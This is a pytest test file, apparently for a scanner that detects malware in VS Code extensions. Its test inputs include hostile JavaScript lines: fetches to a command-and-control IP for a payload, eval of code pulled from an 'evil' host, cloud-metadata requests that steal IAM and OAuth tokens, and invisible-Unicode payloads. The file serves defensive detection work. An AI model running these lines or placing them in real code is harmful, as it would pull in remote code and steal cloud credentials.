"""C-003,004,006,007,009,010,011 + X-001,002,003 positive/negative."""

from vscode_analysis.code_scan import scan_source_file


def _ids(findings):
    return {f["rule_id"] for f in findings}


# --- C-003 ---
def test_c003_positive_eval():
    findings, _ = scan_source_file("a.js", "const x = eval('1+1');")
    assert "C-003" in _ids(findings)


def test_c003_positive_vm_runinthiscontext():
    findings, _ = scan_source_file("a.js", "vm.runInThisContext(payload);")
    assert "C-003" in _ids(findings)


def test_c003_negative_evaluate_word():
    findings, _ = scan_source_file("a.js", "function evaluate() { return doEval; }")
    assert "C-003" not in _ids(findings)


# --- C-004 ---
def test_c004_positive_invisible_unicode():
    payload = "const p = '" + "​" * 6 + "';"
    findings, _ = scan_source_file("a.js", payload)
    assert "C-004" in _ids(findings)


def test_c004_negative_normal_text():
    findings, _ = scan_source_file("a.js", "const greeting = 'hello world';")
    assert "C-004" not in _ids(findings)


def test_c004_negative_few_invisible():
    # 4자 (5자 미만)
    findings, _ = scan_source_file("a.js", "x" + "​" * 4 + "y")
    assert "C-004" not in _ids(findings)


# --- C-006 ---
def test_c006_positive_known_c2_ip():
    findings, _ = scan_source_file("a.js", "fetch('http://199.247.10.166/get_zombi_payload')")
    assert "C-006" in _ids(findings)


def test_c006_negative_benign_ip():
    findings, _ = scan_source_file("a.js", "const local = '127.0.0.1';")
    assert "C-006" not in _ids(findings)


# --- C-007 ---
def test_c007_positive_aws_imds():
    findings, _ = scan_source_file("a.js", "http.get('http://169.254.169.254/latest/meta-data/')")
    assert "C-007" in _ids(findings)


def test_c007_negative():
    findings, _ = scan_source_file("a.js", "const url = 'https://example.com';")
    assert "C-007" not in _ids(findings)


# --- C-009 ---
def test_c009_positive_github_search():
    findings, _ = scan_source_file("a.js", "axios.get('https://api.github.com/search/commits?q=firedalazer')")
    assert "C-009" in _ids(findings)


def test_c009_negative_normal_github():
    findings, _ = scan_source_file("a.js", "fetch('https://api.github.com/repos/x/y')")
    assert "C-009" not in _ids(findings)


# --- C-010 ---
def test_c010_positive_solana():
    findings, _ = scan_source_file("a.js", "const rpc = 'https://api.mainnet-beta.solana.com';")
    assert "C-010" in _ids(findings)


def test_c010_negative():
    findings, _ = scan_source_file("a.js", "const rpc = 'https://my-node.example';")
    assert "C-010" not in _ids(findings)


# --- C-011 ---
def test_c011_positive_native_node():
    findings, counts = scan_source_file("a.js", "const m = require('./build/Release/addon.node');")
    assert "C-011" in _ids(findings)
    assert counts["medium"] >= 1


def test_c011_negative_normal_require():
    findings, _ = scan_source_file("a.js", "const fs = require('fs');")
    assert "C-011" not in _ids(findings)


# --- X-001 ---
def test_x001_positive_pat_with_context():
    pat = "a" * 52  # 52자 base32 (a는 base32 alphabet)
    content = f"// vsce publish token\nconst VSCE_PAT = '{pat}';"
    findings, _ = scan_source_file("a.js", content)
    assert "X-001" in _ids(findings)


def test_x001_negative_pat_without_context():
    pat = "a" * 52
    findings, _ = scan_source_file("a.js", f"const hash = '{pat}';")
    assert "X-001" not in _ids(findings)


# --- X-002 ---
def test_x002_positive_openai_key():
    findings, _ = scan_source_file("a.js", "const k = 'sk-" + "A" * 45 + "';")
    assert "X-002" in _ids(findings)


def test_x002_positive_aws_key():
    findings, _ = scan_source_file("a.js", "AKIA" + "ABCDEFGHIJ123456")
    assert "X-002" in _ids(findings)


def test_x002_negative_masked_example():
    findings, _ = scan_source_file("a.js", "const EXAMPLE_KEY = 'sk-" + "A" * 45 + "'; // EXAMPLE")
    assert "X-002" not in _ids(findings)


def test_x002_negative_placeholder():
    findings, _ = scan_source_file("a.js", "key = 'AKIAPLACEHOLDER12345' // PLACEHOLDER")
    assert "X-002" not in _ids(findings)


# --- X-003 ---
def test_x003_positive_gcp_key():
    content = '{"type":"service_account","private_key":"-----BEGIN PRIVATE KEY-----\\nMII..."}'
    findings, _ = scan_source_file("k.json", content)
    assert "X-003" in _ids(findings)


def test_x003_negative():
    findings, _ = scan_source_file("k.json", '{"type":"service_account","client_email":"x@y.iam"}')
    assert "X-003" not in _ids(findings)


# --- C-003 좁은 정상-맥락 예외 (번들러 보일러플레이트만 면제) ---
def test_c003_exempt_globalthis_polyfill():
    """new Function("return this") globalThis 폴리필은 면제."""
    findings, _ = scan_source_file("a.js", 'var g = (function(){try{return this||new Function("return this")()}catch(e){}})();')
    assert "C-003" not in _ids(findings)


def test_c003_exempt_eval_require_shim():
    """eval("require('util').inspect") CommonJS shim은 면제."""
    findings, _ = scan_source_file("a.js", "const utilInspect = eval(\"require('util').inspect\");")
    assert "C-003" not in _ids(findings)


def test_c003_exempt_eval_require_no_member():
    """eval("require('util')") 멤버 없는 require shim도 면제."""
    findings, _ = scan_source_file("a.js", "const u = eval(\"require('util')\");")
    assert "C-003" not in _ids(findings)


def test_c003_fires_function_with_concat():
    """new Function("return "+x) 동적 연결은 Critical 발화 (면제 금지)."""
    findings, _ = scan_source_file("a.js", 'const f = new Function("return " + x);')
    assert "C-003" in _ids(findings)


def test_c003_fires_function_user_input():
    """new Function(userInput) 변수 인자는 Critical 발화."""
    findings, _ = scan_source_file("a.js", "const f = new Function(userInput);")
    assert "C-003" in _ids(findings)


def test_c003_fires_eval_variable():
    """eval(decoded) 변수 인자는 Critical 발화."""
    findings, _ = scan_source_file("a.js", "eval(decoded);")
    assert "C-003" in _ids(findings)


def test_c003_fires_eval_concat():
    """eval("a"+b) 연결 인자는 Critical 발화."""
    findings, _ = scan_source_file("a.js", 'eval("a" + b);')
    assert "C-003" in _ids(findings)


def test_c003_fires_eval_arbitrary_literal():
    """eval("악성 리터럴")은 require shim이 아니므로 Critical 발화 (비자명 eval)."""
    findings, _ = scan_source_file("a.js", "eval(\"fetch('http://evil/x').then(r=>r.text()).then(eval)\");")
    assert "C-003" in _ids(findings)


def test_c003_fires_vm_runinthiscontext_alongside_exempt():
    """면제 폴리필이 있어도 같은 파일의 vm.runInThisContext는 Critical 발화."""
    content = 'new Function("return this")();\nvm.runInThisContext(payload);'
    findings, _ = scan_source_file("a.js", content)
    assert "C-003" in _ids(findings)


def test_c003_fires_dynamic_eval_alongside_exempt_shim():
    """require shim과 동적 eval이 섞이면 동적 eval로 발화 (좁은 예외 증명)."""
    content = "const u = eval(\"require('util')\");\neval(decoded);"
    findings, _ = scan_source_file("a.js", content)
    assert "C-003" in _ids(findings)


# --- C-007 보안-인지 정제 (instance 텔레메트리 면제 / identity·token 발화) ---
def test_c007_exempt_azure_instance_metadata():
    """Azure IMDS instance/compute (VM 탐지 텔레메트리)는 면제."""
    content = (
        'const opts={headers:{Metadata:"True"}};'
        'makeRequest("http://169.254.169.254/metadata/instance/compute?api-version=2017-12-01&format=json");'
    )
    findings, _ = scan_source_file("a.js", content)
    assert "C-007" not in _ids(findings)


def test_c007_fires_azure_identity_token():
    """169.254.169.254/metadata/identity/oauth2/token 자격증명 탈취는 Critical 발화."""
    content = 'fetch("http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com");'
    findings, _ = scan_source_file("a.js", content)
    assert "C-007" in _ids(findings)


def test_c007_fires_metadata_ip_standalone_exfil():
    """정상 instance 경로 맥락 없이 메타데이터 IP 단독 등장은 Critical 발화."""
    content = "fetch('http://169.254.169.254/latest/meta-data/').then(r=>send(r));"
    findings, _ = scan_source_file("a.js", content)
    assert "C-007" in _ids(findings)


def test_c007_fires_aws_iam_credentials():
    """AWS /iam/security-credentials 자격증명 경로는 Critical 발화 (면제 금지)."""
    content = "http.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/role');"
    findings, _ = scan_source_file("a.js", content)
    assert "C-007" in _ids(findings)


def test_c007_fires_gcp_token_metadata():
    """GCP /computeMetadata/ 토큰 경로는 Critical 발화 (면제 금지)."""
    content = "fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token');"
    findings, _ = scan_source_file("a.js", content)
    assert "C-007" in _ids(findings)


def test_c007_fires_identity_even_with_instance_path():
    """instance 경로가 있어도 identity/token 경로가 함께 있으면 Critical 발화 (면제 금지)."""
    content = (
        'makeRequest("http://169.254.169.254/metadata/instance/compute?api-version=2017-12-01");'
        'fetch("http://169.254.169.254/metadata/identity/oauth2/token");'
    )
    findings, _ = scan_source_file("a.js", content)
    assert "C-007" in _ids(findings)


# --- C1 회귀: 화이트리스트 publisher가 코드룰을 면제하면 안 됨 ---
def test_c003_fires_even_when_publisher_whitelisted():
    """침해된 신뢰 publisher 위협모델: non-vendored eval은 publisher 무관하게 C-003 발화."""
    findings, _ = scan_source_file(
        "extension/out/main.js", "const x = eval(payload);", publisher_whitelisted=True
    )
    assert "C-003" in _ids(findings)


def test_c006_fires_even_when_publisher_whitelisted():
    """non-vendored C2 IP는 publisher 무관하게 C-006 발화."""
    findings, _ = scan_source_file(
        "extension/out/main.js", "fetch('http://199.247.10.166/x')", publisher_whitelisted=True
    )
    assert "C-006" in _ids(findings)


# --- C2 회귀: vendored 제외는 FP 우려 룰(C-003/C-011)에만 한정 ---
def test_c006_fires_in_node_modules():
    """node_modules 경로라도 C-006(C2 IP)는 발화해야 함 (FN 방지)."""
    findings, _ = scan_source_file(
        "extension/node_modules/evil/index.js", "fetch('http://199.247.10.166/x')"
    )
    assert "C-006" in _ids(findings)


def test_c004_fires_in_node_modules():
    """node_modules 경로라도 C-004(비가시 Unicode)는 발화해야 함."""
    payload = "const p = '" + "​" * 6 + "';"
    findings, _ = scan_source_file("extension/node_modules/evil/index.js", payload)
    assert "C-004" in _ids(findings)


def test_c003_skipped_in_node_modules():
    """vendored 제외는 C-003엔 여전히 적용 (python 번들 lib FP 방지)."""
    findings, _ = scan_source_file(
        "extension/node_modules/somelib/index.js", "const x = eval('1+1');"
    )
    assert "C-003" not in _ids(findings)


def test_c011_skipped_in_node_modules():
    """vendored 제외는 C-011(native .node)에도 적용 (정상 native dep FP 방지)."""
    findings, _ = scan_source_file(
        "extension/node_modules/somelib/index.js", "require('./build/Release/addon.node');"
    )
    assert "C-011" not in _ids(findings)
